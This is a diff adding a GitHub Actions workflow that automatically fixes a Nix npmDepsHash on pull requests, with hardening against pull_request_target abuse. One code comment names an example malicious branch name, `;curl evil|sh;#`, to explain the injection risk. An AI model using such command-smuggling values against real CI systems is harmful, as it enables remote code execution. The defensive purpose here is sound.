@@ -1,0 +1,185 @@
+name: Auto Fix npmDepsHash on PRs
+
+# `pull_request_target` is safe here because the workflow runs from
+# base, the PR head is read only as data via `gh api` (never as code),
+# and the hash is computed by `prefetch-npm-deps` which fetches tarballs
+# by SRI integrity only and never executes npm or postinstall scripts.
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+    paths:
+      - web/package-lock.json
+
+concurrency:
+  group: nix-npm-hash-fix-pr-${{ github.event.pull_request.number }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  auto-fix:
+    name: Compute and apply hash
+    runs-on: ubuntu-latest
+    if: github.event.pull_request.state == 'open'
+
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
+        with:
+          ref: ${{ github.event.pull_request.base.sha }}
+          persist-credentials: false
+
+      - uses: nixbuild/nix-quick-install-action@2c9db80fb984ceb1bcaa77cdda3fdf8cfba92035 # v34
+
+      - name: Detect fork and pin head SHA
+        id: pr
+        env:
+          # All PR-controlled values are passed via env (never interpolated
+          # directly into `run:`). A fork branch named `;curl evil|sh;#`
+          # would otherwise get RCE under `pull_request_target`.
+          HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+          BASE_REPO: ${{ github.repository }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
+        run: |
+          if [ "$HEAD_REPO" = "$BASE_REPO" ]; then
+            echo "is_fork=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "is_fork=true" >> "$GITHUB_OUTPUT"
+          fi
+          echo "head_sha=$HEAD_SHA" >> "$GITHUB_OUTPUT"
+          echo "head_ref=$HEAD_REF" >> "$GITHUB_OUTPUT"
+          echo "head_repo=$HEAD_REPO" >> "$GITHUB_OUTPUT"
+
+      - name: Fetch lockfile and flake.nix from PR head (data, not code)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_REPO: ${{ steps.pr.outputs.head_repo }}
+          HEAD_SHA: ${{ steps.pr.outputs.head_sha }}
+        run: |
+          set -euo pipefail
+          mkdir -p pr-head/web
+          gh api -H "Accept: application/vnd.github.raw" \
+            "/repos/${HEAD_REPO}/contents/web/package-lock.json?ref=${HEAD_SHA}" \
+            > pr-head/web/package-lock.json
+          gh api -H "Accept: application/vnd.github.raw" \
+            "/repos/${HEAD_REPO}/contents/flake.nix?ref=${HEAD_SHA}" \
+            > pr-head/flake.nix
+
+      - name: Compute new npmDepsHash
+        id: hash
+        run: |
+          set -euo pipefail
+          NEW_HASH=$(nix run .#prefetch-npm-deps -- pr-head/web/package-lock.json)
+          if ! printf '%s' "$NEW_HASH" | grep -qE '^sha256-[A-Za-z0-9+/]{43}=$'; then
+            echo "::error::prefetch-npm-deps emitted unexpected hash shape: $NEW_HASH"
+            exit 1
+          fi
+          CUR_HASH=$(.github/scripts/get-flake-npm-hash.sh pr-head/flake.nix)
+          echo "current=$CUR_HASH" >> "$GITHUB_OUTPUT"
+          echo "computed=$NEW_HASH" >> "$GITHUB_OUTPUT"
+          if [ "$NEW_HASH" = "$CUR_HASH" ]; then
+            echo "changed=false" >> "$GITHUB_OUTPUT"
+          else
+            echo "changed=true" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Push fix commit (same-repo PRs only)
+        if: steps.hash.outputs.changed == 'true' && steps.pr.outputs.is_fork == 'false'
+        env:
+          # RELEASE_TOKEN is a PAT; PAT pushes (unlike GITHUB_TOKEN)
+          # retrigger downstream workflows so `Nix Build Web` re-runs.
+          GH_TOKEN: ${{ secrets.RELEASE_TOKEN }}
+          NEW_HASH: ${{ steps.hash.outputs.computed }}
+          HEAD_REF: ${{ steps.pr.outputs.head_ref }}
+          HEAD_SHA: ${{ steps.pr.outputs.head_sha }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          PR_AUTHOR_ID: ${{ github.event.pull_request.user.id }}
+          BASE_REPO: ${{ github.repository }}
+          WORKSPACE: ${{ github.workspace }}
+        run: |
+          set -euo pipefail
+          git clone --depth 1 --branch "$HEAD_REF" -- \
+            "https://x-access-token:${GH_TOKEN}@github.com/${BASE_REPO}.git" \
+            pr-checkout
+
+          # If the PR head moved between the API fetch and now, abort
+          # so the new synchronize event retriggers us.
+          ACTUAL_SHA=$(git -C pr-checkout rev-parse HEAD)
+          if [ "$ACTUAL_SHA" != "$HEAD_SHA" ]; then
+            echo "head SHA moved ($HEAD_SHA -> $ACTUAL_SHA); next synchronize will retry."
+            exit 0
+          fi
+
+          "$WORKSPACE/.github/scripts/set-flake-npm-hash.sh" pr-checkout/flake.nix "$NEW_HASH"
+
+          if [ "$(git -C pr-checkout diff --name-only)" != "flake.nix" ]; then
+            echo "::error::patch touched files other than flake.nix"
+            git -C pr-checkout diff --name-only
+            exit 1
+          fi
+
+          git -C pr-checkout config user.name "github-actions[bot]"
+          git -C pr-checkout config user.email "github-actions[bot]@users.noreply.github.com"
+          git -C pr-checkout commit \
+            -m "chore: update Nix npmDepsHash for web dependencies" \
+            -m "Co-authored-by: ${PR_AUTHOR} <${PR_AUTHOR_ID}+${PR_AUTHOR}@users.noreply.github.com>" \
+            flake.nix
+
+          # --force-with-lease anchored to the SHA we read above so a
+          # racing force-push from the contributor cannot be clobbered.
+          git -C pr-checkout push \
+            --force-with-lease="${HEAD_REF}:${HEAD_SHA}" \
+            origin "HEAD:${HEAD_REF}"
+
+      - name: Comment on fork PRs
+        if: steps.pr.outputs.is_fork == 'true'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          NEW_HASH: ${{ steps.hash.outputs.computed }}
+          CUR_HASH: ${{ steps.hash.outputs.current }}
+          CHANGED: ${{ steps.hash.outputs.changed }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          BASE_REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+
+          # `databaseId` (not `id`) returns the numeric REST ID; the GraphQL
+          # node id `IC_kw...` 404s on the REST PATCH/DELETE endpoints below.
+          EXISTING=$(gh pr view "$PR_NUMBER" --json comments \
+            --jq '.comments[] | select(.author.login == "github-actions" and (.body | startswith("<!-- nix-npm-hash-fix-pr -->"))) | .databaseId' \
+            | head -n1)
+
+          if [ "$CHANGED" = "false" ]; then
+            if [ -n "$EXISTING" ]; then
+              gh api --method DELETE \
+                "/repos/${BASE_REPO}/issues/comments/${EXISTING}" >/dev/null
+            fi
+            exit 0
+          fi
+
+          {
+            echo "<!-- nix-npm-hash-fix-pr -->"
+            echo
+            echo "The \`Nix Build Web\` check fails because \`flake.nix\`'s \`npmDepsHash\` does not match this PR's \`web/package-lock.json\`. The bot cannot push to fork branches; please apply the fix below."
+            echo
+            echo "**Old:** \`${CUR_HASH}\`  "
+            echo "**New:** \`${NEW_HASH}\`"
+            echo
+            echo "Update the \`npmDepsHash = \"...\"\` line in \`flake.nix\` to:"
+            echo
+            echo '```nix'
+            echo "            npmDepsHash = \"${NEW_HASH}\";"
+            echo '```'
+            echo
+            echo "Then \`git add flake.nix && git commit -m 'chore: update Nix npmDepsHash for web dependencies' && git push\`."
+          } > /tmp/comment-body.md
+
+          if [ -n "$EXISTING" ]; then
+            gh api --method PATCH "/repos/${BASE_REPO}/issues/comments/${EXISTING}" \
+              -f body="$(cat /tmp/comment-body.md)" >/dev/null
+          else
+            gh pr comment "$PR_NUMBER" --body-file /tmp/comment-body.md
+          fi
